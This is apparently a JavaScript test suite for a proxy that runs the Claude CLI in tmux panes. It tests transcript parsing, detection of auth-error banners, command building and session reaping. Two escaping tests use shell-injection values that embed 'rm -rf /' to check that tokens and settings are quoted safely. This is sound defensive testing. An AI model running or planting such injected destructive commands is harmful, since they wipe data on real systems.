  // writes: [role_chunk, content_chunk_1, content_chunk_2, content_chunk_3, stop_chunk, [DONE]]
  assert.equal(res.writes.length, 6);
  const c1 = JSON.parse(res.writes[1].replace(/^data: /, "").trim());
  assert.equal(c1.choices[0].delta.content.length, 80);
  const c2 = JSON.parse(res.writes[2].replace(/^data: /, "").trim());
  assert.equal(c2.choices[0].delta.content.length, 80);
  const c3 = JSON.parse(res.writes[3].replace(/^data: /, "").trim());
  assert.equal(c3.choices[0].delta.content.length, 40);
});

test("streamStringAsSSE empty content: role + stop + [DONE] only", () => {
  const res = _makeFakeRes();
  _testStreamStringAsSSE(res, "test-id-3", "claude-haiku", "");
  // writes: [role_chunk, stop_chunk, [DONE]]
  assert.equal(res.writes.length, 3);
  const stop = JSON.parse(res.writes[1].replace(/^data: /, "").trim());
  assert.equal(stop.choices[0].finish_reason, "stop");
  assert.equal(res.writes[2], "data: [DONE]\n\n");
});

// ── Suite: TUI transcript reader ────────────────────────────────────────
import { findTranscriptPath, parseTranscriptLines, isTerminalLine, extractLatestAssistantText, verifyEntrypoint, detectTuiUpstreamError } from "./lib/tui/transcript.mjs";
import { readFileSync as tuiReadFileSync, mkdtempSync as tuiMkdtemp0, mkdirSync as tuiMkdir0, writeFileSync as tuiWrite0 } from "node:fs";
import { tmpdir as tuiTmp0 } from "node:os";

console.log("\nTUI transcript — path formula:");

test("findTranscriptPath locates <sid>.jsonl across projects subdirs by UUID", () => {
  const home = tuiMkdtemp0(`${tuiTmp0()}/tui-home-`);
  const sid = "11111111-2222-3333-4444-555555555555";
  const proj = `${home}/.claude/projects/-some--weird-encoding`;
  tuiMkdir0(proj, { recursive: true });
  tuiWrite0(`${proj}/${sid}.jsonl`, "{}\n");
  assert.equal(findTranscriptPath(home, sid), `${proj}/${sid}.jsonl`);
  assert.equal(findTranscriptPath(home, "no-such-uuid"), null);
  assert.equal(findTranscriptPath(null, sid), null);
});

console.log("\nTUI transcript — parsing + terminal detection:");

test("parseTranscriptLines skips blank + malformed/partial lines", () => {
  const evs = parseTranscriptLines('{"a":1}\n\n{bad json\n{"b":2}\n');
  assert.equal(evs.length, 2);
  assert.equal(evs[1].b, 2);
});
test("isTerminalLine true on turn_duration", () => {
  assert.equal(isTerminalLine({ type: "system", subtype: "turn_duration" }), true);
});
test("isTerminalLine false on stop_reason tool_use (message-wrapped) — tool_use is mid-turn in TUI mode", () => {
  assert.equal(isTerminalLine({ type: "assistant", message: { stop_reason: "tool_use" } }), false);
});
test("isTerminalLine false on stop_reason tool_use (flat) — claude continues after tool, turn not done", () => {
  assert.equal(isTerminalLine({ stop_reason: "tool_use" }), false);
});
test("isTerminalLine false on ordinary assistant text line", () => {
  assert.equal(isTerminalLine({ type: "assistant", message: { content: [{ type: "text", text: "hi" }] } }), false);
});
// issue #130 cloud/server-side: claude builds (e.g. 2.1.114) that DON'T emit
// turn_duration mark turn-end via assistant message.stop_reason — must be terminal.
test("isTerminalLine true on assistant stop_reason end_turn (version-robust, e.g. 2.1.114)", () => {
  assert.equal(isTerminalLine({ type: "assistant", message: { stop_reason: "end_turn", content: [{ type: "text", text: "ok" }] } }), true);
});
test("isTerminalLine true on assistant stop_reason stop_sequence / max_tokens", () => {
  assert.equal(isTerminalLine({ type: "assistant", message: { stop_reason: "stop_sequence" } }), true);
  assert.equal(isTerminalLine({ type: "assistant", message: { stop_reason: "max_tokens" } }), true);
});
test("extractLatestAssistantText concatenates text blocks of LAST assistant entry", () => {
  const evs = [
    { type: "assistant", message: { content: [{ type: "text", text: "first" }] } },
    { type: "user", message: { content: "..." } },
    { type: "assistant", message: { content: [{ type: "text", text: "A" }, { type: "thinking", thinking: "x" }, { type: "text", text: "B" }] } },
  ];
  assert.equal(extractLatestAssistantText(evs), "AB");
});
test("extractLatestAssistantText ignores thinking-only assistant entries", () => {
  // Fixture shape: thinking block and text block are SEPARATE top-level entries sharing same msg id
  const evs = [
    { type: "assistant", message: { content: [{ type: "thinking", thinking: "hmm" }] } },
    { type: "assistant", message: { content: [{ type: "text", text: "PONG" }] } },
  ];
  assert.equal(extractLatestAssistantText(evs), "PONG");
});
test("real complete fixture: parseTranscriptLines yields >0 events", () => {
  const evs = parseTranscriptLines(tuiReadFileSync("./lib/tui/fixtures/complete-haiku.jsonl", "utf8"));
  assert.ok(evs.length > 0, "fixture must parse to events");
});
test("real complete fixture: at least one isTerminalLine", () => {
  const evs = parseTranscriptLines(tuiReadFileSync("./lib/tui/fixtures/complete-haiku.jsonl", "utf8"));
  assert.ok(evs.some(isTerminalLine), "fixture must contain a terminal line");
});
test("real complete fixture: extractLatestAssistantText returns non-empty text", () => {
  const evs = parseTranscriptLines(tuiReadFileSync("./lib/tui/fixtures/complete-haiku.jsonl", "utf8"));
  assert.ok(extractLatestAssistantText(evs).length > 0, "fixture must yield assistant text");
});
test("real complete fixture: extractLatestAssistantText returns the FINAL text, not the first", () => {
  // The fixture's first assistant text is "PONG"; it is followed by 8 later refusal
  // turns. Pinning the exact FINAL string guards the overwrite-to-last semantic —
  // a regression that returned the first text block would still pass a length check.
  const evs = parseTranscriptLines(tuiReadFileSync("./lib/tui/fixtures/complete-haiku.jsonl", "utf8"));
  assert.equal(extractLatestAssistantText(evs), "I'm moving on. If you have a genuine task, let me know.");
});
test("real complete fixture: verifyEntrypoint returns 'cli'", () => {
  const evs = parseTranscriptLines(tuiReadFileSync("./lib/tui/fixtures/complete-haiku.jsonl", "utf8"));
  assert.equal(verifyEntrypoint(evs), "cli");
});

// ── C-3 (#133): verifyEntrypoint is version-robust ───────────────────────
// Some claude builds do NOT emit a turn_duration line; entrypoint lives on
// ordinary lines on BOTH emitting and non-emitting builds. Reading ONLY
// turn_duration made the server.mjs tui_entrypoint_mismatch assertion get null
// every turn on non-emitting builds. verifyEntrypoint must fall back to ANY line.
console.log("\nTUI transcript — verifyEntrypoint version-robustness (C-3, #133):");

test("verifyEntrypoint PREFERS the turn_duration line's entrypoint", () => {
  // turn_duration says "cli"; an earlier ordinary line says "sdk-cli" — the
  // authoritative turn_duration value must win, not last-writer-wins on the fallback.
  const evs = [
    { type: "assistant", entrypoint: "sdk-cli", message: { content: [{ type: "text", text: "x" }] } },
    { type: "system", subtype: "turn_duration", entrypoint: "cli" },
  ];
  assert.equal(verifyEntrypoint(evs), "cli");
});
test("verifyEntrypoint falls back to entrypoint on an ordinary assistant line when no turn_duration", () => {
  const evs = [
    { type: "user", entrypoint: "cli", message: { content: "hi" } },
    { type: "assistant", entrypoint: "cli", message: { stop_reason: "end_turn", content: [{ type: "text", text: "ok" }] } },
  ];
  assert.equal(verifyEntrypoint(evs), "cli");
});
test("verifyEntrypoint returns null when NO line carries an entrypoint", () => {
  const evs = [
    { type: "assistant", message: { stop_reason: "end_turn", content: [{ type: "text", text: "ok" }] } },
  ];
  assert.equal(verifyEntrypoint(evs), null);
});
test("real no-turn_duration fixture: verifyEntrypoint still resolves 'cli' (was null before C-3)", () => {
  const evs = parseTranscriptLines(tuiReadFileSync("./lib/tui/fixtures/no-turn-duration.jsonl", "utf8"));
  // Sanity: the fixture genuinely lacks a turn_duration line (so this exercises the fallback).
  assert.ok(!evs.some((e) => e && e.type === "system" && e.subtype === "turn_duration"), "fixture must NOT emit turn_duration");
  assert.equal(verifyEntrypoint(evs), "cli");
});

// ── C-1 (#133): honest AUTH-FAILURE banner detection ─────────────────────
// The interactive claude CLI renders in-session errors as ordinary assistant text.
// C-1 catches the R-1 case: expired/invalid creds, where EVERY turn returns the same
// one-line auth-failure banner and OCP would cache it as a real answer. The detector
// is deliberately NARROW/conservative: a false-positive (killing a real long answer
// that merely DISCUSSES an API error) costs the user a missing answer + a double-burn
// retry, which is worse than the rare false-negative (caching one transient error for
// the 5-min TTL). Signal = ALL of: SHORT whole-message (≤100; live samples 69/73) AND
// "API Error: 4xx" AND an auth keyword (authenticat | /login | credential) AND NO
// backtick/quote char. When unsure → PASS. The earlier generalised rule
// (^<short-prefix>?API Error:\d{3}.*$) was TOO BROAD: its unbounded .* tail killed
// legit long answers; this block encodes the full narrowed matrix.
console.log("\nTUI transcript — auth-failure banner detection (C-1, #133):");

// ---- Required matrix: MUST detect (kill) ----
test("C-1 KILL: live /login 401 auth banner", () => {
  const banner = "Please run /login · API Error: 401 Invalid authentication credentials";
  assert.equal(detectTuiUpstreamError(banner), banner);
});
test("C-1 KILL: live 'Failed to authenticate.' 401 banner variant", () => {
  // Second real PI231 banner: a different short auth-failure prefix before the same
  // "API Error: 4xx" core. Still short, still 4xx, still has 'authenticate'/'credentials'.
  const banner = "Failed to authenticate. API Error: 401 Invalid authentication credentials";
  assert.equal(detectTuiUpstreamError(banner), banner);
});

// ---- Required matrix: MUST NOT kill (pass) ----
test("C-1 PASS: long answer discussing a 500 (not 4xx, too long)", () => {
  // The exact false-positive the over-broad .* rule produced. 166 chars; 5xx.
  const legit = "API Error: 500 happened because the server was overloaded. To fix this, retry with exponential backoff and verify your rate limits before resending the request again.";
  assert.equal(detectTuiUpstreamError(legit), null);
});
test("C-1 PASS: long answer with 'API Error: 401 details' (too long, no auth keyword)", () => {
  // 142 chars; the literal word 'authenticate'/'credential'/'/login' never appears, and
  // it is far over the length cap — rejected on length AND keyword.
  const legit = "Failed to parse the config. Here are the API Error: 401 details you asked about: the token expired and must be refreshed before the next call.";
  assert.equal(detectTuiUpstreamError(legit), null);
});
test("C-1 PASS: 'To debug a 401 … API Error: 401 Unauthorized' (no auth keyword)", () => {
  // 91 chars (short!) and 4xx, but 'Unauthorized' is authoriz-, not authenticat-, and
  // there is no /login or credential — the auth-keyword signal rejects it.
  const legit = "To debug a 401: the server returns API Error: 401 Unauthorized, then you refresh the token.";
  assert.equal(detectTuiUpstreamError(legit), null);
});
test("C-1 PASS: handler answer logging 'API Error: 503' (not 4xx)", () => {
  const legit = "Here is the handler you asked for. It logs the string API Error: 503 on failure and retries.";
  assert.equal(detectTuiUpstreamError(legit), null);
});
test("C-1 PASS: short instructional answer quoting `API Error: 401` + /login (has backtick)", () => {
  // 75 chars: short, 4xx, has '/login' — passes signals 1-3. Rejected ONLY by the
  // backtick/quote constraint: it QUOTES the error in code formatting, it is not the banner.
  const legit = "You'll see `API Error: 401` when your token expires — run /login to fix it.";
  assert.equal(detectTuiUpstreamError(legit), null);
});
test("C-1 PASS: bare HTTP-status sentence (no 'API Error:' core)", () => {
  assert.equal(detectTuiUpstreamError("HTTP 401 means unauthorized."), null);
});
test("C-1 PASS: plain unrelated answer", () => {
  assert.equal(detectTuiUpstreamError("The capital of France is Paris."), null);
});

// ---- Supporting / regression coverage ----
test("C-1 PASS: transient 5xx banner is NOT detected (narrowed to 4xx auth only)", () => {
  // The old rule flagged any 3-digit code; the narrowed detector is 4xx-only by design
  // (5xx is transient/server-side, not the R-1 auth case). Accepted false-negative.
  assert.equal(detectTuiUpstreamError("API Error: 500 Internal Server Error"), null);
});
test("C-1 PASS: bare 4xx with no auth keyword is NOT detected", () => {
  // 'API Error: 403 Forbidden' alone — 4xx and short, but no authenticat/login/credential.
  assert.equal(detectTuiUpstreamError("API Error: 403 Forbidden"), null);
});
test("detectTuiUpstreamError trims surrounding whitespace before matching", () => {
  const out = detectTuiUpstreamError("\n\n  Please run /login · API Error: 401 credential boom  \n");
  assert.equal(out, "Please run /login · API Error: 401 credential boom");
});
test("detectTuiUpstreamError is case-insensitive on the banner keywords", () => {
  // lower-cased: /login + api error: 401 + 'credential' keyword, short, no code char.
  assert.ok(detectTuiUpstreamError("please run /login · api error: 401 bad credential") !== null);
});
test("detectTuiUpstreamError does NOT match prose that mentions an API error mid-paragraph (#133 regression guard)", () => {
  // A long, legit answer that merely discusses an API error — rejected on length alone.
  const para = "When integrating with the upstream service you may occasionally hit an API Error: 401 response if the bearer token has lapsed; the recommended remediation is to re-run the login flow and retry the request with a fresh credential, after which the 401 should clear.";
  assert.equal(detectTuiUpstreamError(para), null);
});
test("detectTuiUpstreamError does NOT match a long plain-text auth answer with NO code chars (length cap is load-bearing)", () => {
  // 226 chars, no backtick/quote, has 4xx + /login + credential + authenticate — passes
  // signals 2-4. ONLY the length cap rejects it. Guards against dropping the cap.
  const para = "If you call the endpoint without a bearer token the API Error: 401 response tells you the credential is missing; just authenticate again with /login and the request will succeed on the next attempt without any further changes.";
  assert.equal(detectTuiUpstreamError(para), null);
});
test("detectTuiUpstreamError returns null on empty / whitespace / non-string", () => {
  assert.equal(detectTuiUpstreamError(""), null);
  assert.equal(detectTuiUpstreamError("   \n  "), null);
  assert.equal(detectTuiUpstreamError(null), null);
  assert.equal(detectTuiUpstreamError(undefined), null);
  assert.equal(detectTuiUpstreamError(42), null);
});
test("detectTuiUpstreamError respects CLAUDE_TUI_ERROR_PATTERNS override (custom banner)", () => {
  // Override with a single custom pattern; the default 401 banner no longer matches,
  // but the custom one does (anchored whole-text).
  assert.equal(detectTuiUpstreamError("Please run /login · API Error: 401 x", "Session expired, please re-auth"), null);
  assert.equal(detectTuiUpstreamError("Session expired, please re-auth", "Session expired, please re-auth"), "Session expired, please re-auth");
});
test("detectTuiUpstreamError with an empty override disables detection (escape hatch)", () => {
  assert.equal(detectTuiUpstreamError("API Error: 500 boom", ""), null);
  assert.equal(detectTuiUpstreamError("API Error: 500 boom", "   "), null);
});
test("detectTuiUpstreamError override accepts '||'-separated patterns", () => {
  const raw = "First banner||Second banner";
  assert.equal(detectTuiUpstreamError("First banner", raw), "First banner");
  assert.equal(detectTuiUpstreamError("Second banner", raw), "Second banner");
  assert.equal(detectTuiUpstreamError("Third", raw), null);
});
test("real error fixture: latest assistant text IS the banner and detectTuiUpstreamError flags it", () => {
  const evs = parseTranscriptLines(tuiReadFileSync("./lib/tui/fixtures/error-401.jsonl", "utf8"));
  const text = extractLatestAssistantText(evs);
  assert.equal(text, "Please run /login · API Error: 401 Invalid authentication credentials");
  assert.ok(detectTuiUpstreamError(text) !== null, "error fixture's final turn must be flagged as an upstream error");
});
test("real error fixture (Failed-to-authenticate variant): final turn is flagged (#133 runtime gap)", () => {
  const evs = parseTranscriptLines(tuiReadFileSync("./lib/tui/fixtures/error-401-failauth.jsonl", "utf8"));
  const text = extractLatestAssistantText(evs);
  assert.equal(text, "Failed to authenticate. API Error: 401 Invalid authentication credentials");
  assert.ok(detectTuiUpstreamError(text) !== null, "Failed-to-authenticate banner must be flagged as an upstream error");
});
test("real complete fixture: final answer is NOT flagged as an upstream error", () => {
  const evs = parseTranscriptLines(tuiReadFileSync("./lib/tui/fixtures/complete-haiku.jsonl", "utf8"));
  const text = extractLatestAssistantText(evs);
  assert.equal(detectTuiUpstreamError(text), null);
});

// ── TUI transcript — polling reader (async) ──────────────────────────────
import { readTuiTranscript } from "./lib/tui/transcript.mjs";
import { mkdtempSync as tuiMkdtemp, writeFileSync as tuiWriteFile } from "node:fs";
import { tmpdir as tuiTmpdir } from "node:os";

console.log("\nTUI transcript — polling reader:");

await asyncTest("readTuiTranscript returns assistant text when terminal marker present", async () => {
  const dir = tuiMkdtemp(`${tuiTmpdir()}/tui-`);
  const p = `${dir}/s.jsonl`;
  tuiWriteFile(p, [
    JSON.stringify({ type: "assistant", message: { content: [{ type: "text", text: "hello world" }] } }),
    JSON.stringify({ type: "system", subtype: "turn_duration", durationMs: 1200, entrypoint: "cli" }),
  ].join("\n") + "\n");
  const out = await readTuiTranscript({ transcriptPath: p, wallclockMs: 2000, pollMs: 50 });
  assert.equal(out.text, "hello world");
  assert.equal(out.entrypoint, "cli");
});

// C-2 (#133): the terminal-marker path must signal a COMPLETE turn.
await asyncTest("readTuiTranscript signals truncated:false when a terminal marker is hit (complete turn)", async () => {
  const dir = tuiMkdtemp(`${tuiTmpdir()}/tui-`);
  const p = `${dir}/s.jsonl`;
  tuiWriteFile(p, [
    JSON.stringify({ type: "assistant", message: { content: [{ type: "text", text: "done" }] } }),
    JSON.stringify({ type: "system", subtype: "turn_duration", durationMs: 1200, entrypoint: "cli" }),
  ].join("\n") + "\n");
  const out = await readTuiTranscript({ transcriptPath: p, wallclockMs: 2000, pollMs: 50 });
  assert.equal(out.truncated, false);
});

// C-2 (#133): cap-with-partial-text must be DISTINGUISHABLE from a complete turn.
// Previously both returned {text, entrypoint} identically and the partial was cached
// + returned as finish_reason:stop. The cap path now returns truncated:true so the
// caller (callClaudeTui) can throw instead of serving a cut-off answer.
await asyncTest("readTuiTranscript honours wall-clock cap and flags partial text truncated:true", async () => {
  const dir = tuiMkdtemp(`${tuiTmpdir()}/tui-`);
  const p = `${dir}/s.jsonl`;
  // No terminal marker → reader will spin to the cap then return the partial.
  tuiWriteFile(p, JSON.stringify({ type: "assistant", message: { content: [{ type: "text", text: "partial" }] } }) + "\n");
  const out = await readTuiTranscript({ transcriptPath: p, wallclockMs: 300, pollMs: 50 });
  assert.equal(out.text, "partial");
  assert.equal(out.truncated, true);
});

await asyncTest("readTuiTranscript against real fixture: entrypoint is 'cli'", async () => {
  const out = await readTuiTranscript({ transcriptPath: "./lib/tui/fixtures/complete-haiku.jsonl", wallclockMs: 2000, pollMs: 50 });
  assert.equal(out.entrypoint, "cli");
});

await asyncTest("readTuiTranscript throws when no text and cap elapses", async () => {
  const dir = tuiMkdtemp(`${tuiTmpdir()}/tui-`);
  const p = `${dir}/missing.jsonl`;
  let threw = false;
  try { await readTuiTranscript({ transcriptPath: p, wallclockMs: 200, pollMs: 50 }); }
  catch { threw = true; }
  assert.ok(threw, "must throw on empty timeout");
});

// ── TUI session reaper ───────────────────────────────────────────────────
import { reapStaleTuiSessions, sessionPrefixForPort, LEGACY_SESSION_PREFIX, LEGACY_SESSION_NAME_RE, buildTuiCmd } from "./lib/tui/session.mjs";

console.log("\nTUI session reaper:");

// F7 fix: the session prefix is instance-scoped by listen port so a second OCP
// instance on the same host (different port) is never mistaken for "ours".
test("sessionPrefixForPort embeds the port (F7 instance scoping)", () => {
  assert.equal(sessionPrefixForPort(3456), "ocp-tui-3456-");
  assert.equal(sessionPrefixForPort(4000), "ocp-tui-4000-");
  assert.notEqual(sessionPrefixForPort(3456), sessionPrefixForPort(4000));
});

test("LEGACY_SESSION_NAME_RE matches only the exact old bare-prefix shape, never the new shape", () => {
  assert.ok(LEGACY_SESSION_NAME_RE.test(`${LEGACY_SESSION_PREFIX}a1b2c3d4`), "legacy 8-hex shape matches");
  assert.ok(!LEGACY_SESSION_NAME_RE.test("ocp-tui-3456-a1b2c3d4"), "new port-scoped shape must NOT match legacy regex");
  assert.ok(!LEGACY_SESSION_NAME_RE.test("ocp-tui-a1b2c3"), "too-short suffix must not match");
  assert.ok(!LEGACY_SESSION_NAME_RE.test("ocp-tui-a1b2c3d4extra"), "trailing extra chars must not match");
});

console.log("\nTUI command construction (proxy-purity / #4):");

test("buildTuiCmd suppresses host CLAUDE.md + auto-memory (proxy purity, #4)", () => {
  const cmd = buildTuiCmd("/usr/bin/claude", "claude-haiku", "sid-1", "/home/u", "cli");
  // OCP is a proxy: the host's CLAUDE.md / auto-memory must never leak into the proxied turn.
  // Primary mechanism is --safe-mode (env vars alone stopped suppressing on newer claude);
  // the env vars remain as belt-and-braces.
  assert.ok(/(^| )--safe-mode( |$)/.test(cmd), "default pane must pass --safe-mode (disables host CLAUDE.md/skills/plugins/hooks)");
  assert.ok(/(^| )CLAUDE_CODE_DISABLE_CLAUDE_MDS=1( |$)/.test(cmd), "must disable CLAUDE.md injection");
  assert.ok(/(^| )CLAUDE_CODE_DISABLE_AUTO_MEMORY=1( |$)/.test(cmd), "must disable auto-memory injection");
});

test("buildTuiCmd omits --safe-mode when a customization it would strip is in use", () => {
  const save = process.env.OCP_TUI_FULL_TOOLS;
  try {
    delete process.env.OCP_TUI_FULL_TOOLS;
    // streaming registers a MessageDisplay HOOK via --settings; --safe-mode would kill the hook
    // (zero deltas), so it must be omitted on the streaming pane.
    const streaming = buildTuiCmd("/usr/bin/claude", "m", "sid-s", "/home/u", "cli", { file: "/d/sid-s.jsonl", settings: "/d/s.json" });
    assert.ok(!/--safe-mode/.test(streaming), "streaming pane must NOT pass --safe-mode (would disable the MessageDisplay hook)");
    assert.ok(streaming.includes("--settings '/d/s.json'"), "streaming pane keeps its --settings hook");

    // OCP_TUI_FULL_TOOLS grants an MCP/skills surface --safe-mode disables wholesale.
    process.env.OCP_TUI_FULL_TOOLS = "1";
    const full = buildTuiCmd("/usr/bin/claude", "m", "sid-f", "/home/u", "cli");
    assert.ok(!/--safe-mode/.test(full), "full-tools pane must NOT pass --safe-mode (would disable MCP/skills)");
  } finally {
    if (save === undefined) delete process.env.OCP_TUI_FULL_TOOLS; else process.env.OCP_TUI_FULL_TOOLS = save;
  }
});

test("buildTuiCmd keeps version pin + entrypoint label + MCP wall", () => {
  const cli = buildTuiCmd("/usr/bin/claude", "m", "sid-2", "/home/u", "cli");
  assert.ok(cli.includes("DISABLE_AUTOUPDATER=1"), "version pin retained");
  assert.ok(cli.includes("CLAUDE_CODE_ENTRYPOINT=cli"), "cli mode labels the subscription pool");
  assert.ok(cli.includes("--strict-mcp-config") && cli.includes('mcp__*'), "MCP wall retained");
  // 'auto' mode must NOT pin the entrypoint (claude self-classifies via TTY).
  const auto = buildTuiCmd("/usr/bin/claude", "m", "sid-3", "/home/u", "auto");
  assert.ok(!/CLAUDE_CODE_ENTRYPOINT=/.test(auto), "auto mode leaves entrypoint unset");
  assert.ok(/-u CLAUDE_CODE_ENTRYPOINT/.test(auto), "auto mode unsets any inherited entrypoint");
});

// CLAUDE_CODE_OAUTH_TOKEN passthrough (PI231 401 incident): tmux doesn't forward the parent
// env to the pane, so the token must be set explicitly on the pane command or the TUI claude
// falls back to credentials.json (whose refresh token gets corrupted by the spawn/kill cycle).
test("buildTuiCmd passes CLAUDE_CODE_OAUTH_TOKEN when the env is set (shq-escaped)", () => {
  const save = process.env.CLAUDE_CODE_OAUTH_TOKEN;
  try {
    process.env.CLAUDE_CODE_OAUTH_TOKEN = "sk-ant-oat01-abc123";
    const cmd = buildTuiCmd("/usr/bin/claude", "m", "sid-tok", "/home/u", "cli");
    // shq wraps in single quotes; a plain token renders as 'token'.
    assert.ok(cmd.includes("CLAUDE_CODE_OAUTH_TOKEN='sk-ant-oat01-abc123'"),
      "token must be set on the pane command, shq-escaped");
  } finally {
    if (save === undefined) delete process.env.CLAUDE_CODE_OAUTH_TOKEN;
    else process.env.CLAUDE_CODE_OAUTH_TOKEN = save;
  }
});

test("buildTuiCmd does NOT add CLAUDE_CODE_OAUTH_TOKEN when the env is unset", () => {
  const save = process.env.CLAUDE_CODE_OAUTH_TOKEN;
  try {
    delete process.env.CLAUDE_CODE_OAUTH_TOKEN;
    const cmd = buildTuiCmd("/usr/bin/claude", "m", "sid-notok", "/home/u", "cli");
    assert.ok(!/CLAUDE_CODE_OAUTH_TOKEN/.test(cmd),
      "no token added when env unset (credentials.json-only hosts unaffected)");
  } finally {
    if (save === undefined) delete process.env.CLAUDE_CODE_OAUTH_TOKEN;
    else process.env.CLAUDE_CODE_OAUTH_TOKEN = save;
  }
});

test("buildTuiCmd shq-escapes a token containing shell metacharacters (no injection)", () => {
  const save = process.env.CLAUDE_CODE_OAUTH_TOKEN;
  try {
    // A token with a single quote must be escaped via the '\'' idiom so it can't break out
    // of the shell string tmux runs via sh -c.
    process.env.CLAUDE_CODE_OAUTH_TOKEN = "tok'; rm -rf /;'";
    const cmd = buildTuiCmd("/usr/bin/claude", "m", "sid-inj", "/home/u", "cli");
    assert.ok(cmd.includes(`CLAUDE_CODE_OAUTH_TOKEN='tok'\\''; rm -rf /;'\\'''`),
      "single quote must be shq-escaped, not left bare");
    assert.ok(!/CLAUDE_CODE_OAUTH_TOKEN=tok'; rm/.test(cmd), "raw unescaped token must NOT appear");
  } finally {
    if (save === undefined) delete process.env.CLAUDE_CODE_OAUTH_TOKEN;
    else process.env.CLAUDE_CODE_OAUTH_TOKEN = save;
  }
});

// OCP_TUI_EFFORT (TUI latency, docs/plans/2026-07-13-tui-latency): the pane's claude
// must get an EXPLICIT --effort so its effort never depends on which HOME mode
// resolveTuiHome() picked (real-home inherits the operator's settings.json effortLevel;
// env-token scratch inherits claude's built-in default).
test("buildTuiCmd passes --effort low by default (OCP_TUI_EFFORT unset)", () => {
  const save = process.env.OCP_TUI_EFFORT;
  try {
    delete process.env.OCP_TUI_EFFORT;
    const cmd = buildTuiCmd("/usr/bin/claude", "m", "sid-eff1", "/home/u", "cli");
    assert.ok(cmd.includes("--effort low"), "default must pin --effort low");
  } finally {
    if (save === undefined) delete process.env.OCP_TUI_EFFORT;
    else process.env.OCP_TUI_EFFORT = save;
  }
});

test("buildTuiCmd honors an explicit OCP_TUI_EFFORT level (case/space-normalized)", () => {
  const save = process.env.OCP_TUI_EFFORT;
  try {
    process.env.OCP_TUI_EFFORT = " XHigh ";
    const cmd = buildTuiCmd("/usr/bin/claude", "m", "sid-eff2", "/home/u", "cli");
    assert.ok(cmd.includes("--effort xhigh"), "explicit level must be passed, normalized");
    assert.ok(!cmd.includes("--effort low"), "default must not also appear");
  } finally {
    if (save === undefined) delete process.env.OCP_TUI_EFFORT;
    else process.env.OCP_TUI_EFFORT = save;
  }
});

test("buildTuiCmd OCP_TUI_EFFORT=inherit omits --effort entirely (pre-flag argv)", () => {
  const save = process.env.OCP_TUI_EFFORT;
  try {
    process.env.OCP_TUI_EFFORT = "inherit";
    const cmd = buildTuiCmd("/usr/bin/claude", "m", "sid-eff3", "/home/u", "cli");
    assert.ok(!/--effort/.test(cmd), "inherit must not add --effort");
  } finally {
    if (save === undefined) delete process.env.OCP_TUI_EFFORT;
    else process.env.OCP_TUI_EFFORT = save;
  }
});

test("buildTuiCmd falls back to --effort low on an invalid OCP_TUI_EFFORT (never reaches argv)", () => {
  const save = process.env.OCP_TUI_EFFORT;
  const savedErr = console.error;
  try {
    process.env.OCP_TUI_EFFORT = "ludicrous'; rm -rf /;'";
    let warned = "";
    console.error = (...a) => { warned = a.join(" "); };
    const cmd = buildTuiCmd("/usr/bin/claude", "m", "sid-eff4", "/home/u", "cli");
    assert.ok(cmd.includes("--effort low"), "invalid value must fall back to low");
    assert.ok(!cmd.includes("ludicrous"), "invalid raw value must NOT reach the shell string");
    assert.ok(/invalid OCP_TUI_EFFORT/.test(warned), "must log a warning");
  } finally {
    console.error = savedErr;
    if (save === undefined) delete process.env.OCP_TUI_EFFORT;
    else process.env.OCP_TUI_EFFORT = save;
  }
});

test("buildTuiCmd OCP_TUI_FULL_TOOLS=1 grants -p-equivalent tool surface (single-user opt-in)", () => {
  const save = { ...process.env };
  const restore = () => {
    for (const k of ["OCP_TUI_FULL_TOOLS", "CLAUDE_MCP_CONFIG", "CLAUDE_ALLOWED_TOOLS"]) {
      if (k in save) process.env[k] = save[k]; else delete process.env[k];
    }
  };
  try {
    // default (gate off) keeps the MCP wall, no --allowedTools
    delete process.env.OCP_TUI_FULL_TOOLS;
    const off = buildTuiCmd("/usr/bin/claude", "m", "s", "/home/u", "cli");
    assert.ok(off.includes("--strict-mcp-config") && !off.includes("--allowedTools"), "gate off = MCP wall");

    // gate on: --allowedTools (default set incl Bash), MCP wall dropped
    process.env.OCP_TUI_FULL_TOOLS = "1";
    delete process.env.CLAUDE_MCP_CONFIG;
    delete process.env.CLAUDE_ALLOWED_TOOLS;
    const full = buildTuiCmd("/usr/bin/claude", "m", "s", "/home/u", "cli");
    assert.ok(full.includes("--allowedTools") && full.includes("Bash"), "full-tools grants --allowedTools incl Bash");
    assert.ok(!full.includes("--strict-mcp-config") && !/--disallowedTools/.test(full), "full-tools drops the MCP wall");
    assert.ok(!full.includes("--dangerously-skip-permissions"), "skip-permissions branch is removed (bricks headless TUI)");

    // mcp-config threaded through
    process.env.CLAUDE_MCP_CONFIG = "/tmp/mcp.json";
    const mcp = buildTuiCmd("/usr/bin/claude", "m", "s", "/home/u", "cli");
    assert.ok(/--mcp-config '\/tmp\/mcp.json'/.test(mcp), "mcp-config passed through (shq'd)");

    // operator-supplied scoped tool specifiers must be shell-quoted (no injection via ()*~)
    delete process.env.CLAUDE_MCP_CONFIG;
    process.env.CLAUDE_ALLOWED_TOOLS = "Bash(npm run test:*),Read";
    const scoped = buildTuiCmd("/usr/bin/claude", "m", "s", "/home/u", "cli");
    assert.ok(scoped.includes("'Bash(npm run test:*)'"), "scoped tool tokens are shq'd in the shell string");
    assert.ok(!/--allowedTools Bash\(npm/.test(scoped), "scoped token must NOT appear unquoted");
  } finally {
    restore();
  }
});

test("reaper kills ONLY this instance's own port-scoped sessions, never olp-tui-", () => {
  const killed = [];
  const fakeTmux = (args) => {
    if (args[0] === "list-sessions") return { status: 0, stdout: "ocp-tui-3456-aaaa\nolp-tui-bbbb\nmisc\nocp-tui-3456-cccc\n" };
    if (args[0] === "kill-session") { killed.push(args[args.indexOf("-t") + 1]); return { status: 0 }; }
    return { status: 0, stdout: "" };
  };
  const n = reapStaleTuiSessions({ tmux: fakeTmux, port: 3456 });
  assert.equal(n, 2);
  assert.equal(killed.join(","), "ocp-tui-3456-aaaa,ocp-tui-3456-cccc");
  assert.ok(!killed.includes("olp-tui-bbbb"), "olp-tui-bbbb must never be killed");
});

// F7 fix: a second OCP instance on the same host (different port) must be treated exactly
// like a foreign product prefix — never reaped, never allowed to trigger kill-server.
test("reaper treats a sibling OCP instance on a DIFFERENT port as foreign (F7)", () => {
  const killed = [];
  const calls = [];
  const fakeTmux = (args) => {
    calls.push(args.join(" "));
    if (args[0] === "list-sessions") return { status: 0, stdout: "ocp-tui-3456-aaaa\nocp-tui-9999-bbbb\n" };
    if (args[0] === "kill-session") { killed.push(args[args.indexOf("-t") + 1]); return { status: 0 }; }
    return { status: 0, stdout: "" };
  };
  const n = reapStaleTuiSessions({ tmux: fakeTmux, port: 3456 });
  assert.equal(n, 1, "killed only the own-port session");
